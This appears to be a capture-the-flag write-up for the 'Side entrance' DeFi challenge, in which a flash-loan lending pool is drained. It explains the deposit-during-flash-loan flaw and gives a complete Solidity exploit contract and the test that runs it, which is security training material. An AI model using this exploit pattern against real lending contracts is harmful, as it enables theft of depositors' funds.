# Challenge #4 - Side entrance    
 A surprisingly simple lending pool allows anyone to deposit ETH, and withdraw it at any point in time.

 This very simple lending pool has 1000 ETH in balance already, and is offering free flash loans using the deposited ETH to promote their system.

 You must take all ETH from the lending pool. 

## Exploit 
In this challenge we can increase the amount of our balance in pool executing a 
flashloan and making a deposit with that money. This way, we increase our ``balance`` 
without really using any of our ETH and we can withdraw that to the attacker's account 
later.

pragma solidity ^0.8.0;

interface ILendingPool {
	function deposit() external payable;
	function withdraw() external;
	function flashLoan(uint256 amount) external;
}

contract Exploit {
	address attacker;
	ILendingPool pool;
	event Received(address, uint);

	function exec(address _contract) external {
		attacker = msg.sender;
		pool = ILendingPool(_contract);
		pool.flashLoan(1000 ether);
	}

	function withdraw() external {
		pool.withdraw();
		payable(attacker).transfer(address(this).balance);	
	}

	fallback() external payable {
		pool.deposit{value: msg.value}();
	}
	receive() external payable {
		emit Received(msg.sender, msg.value);
	}
}
```
Execution: 
```js
    it('Exploit', async function () {
        /** CODE YOUR EXPLOIT HERE */
		await this.exploit.exec(this.pool.address);
		await this.exploit.withdraw();
    });
```
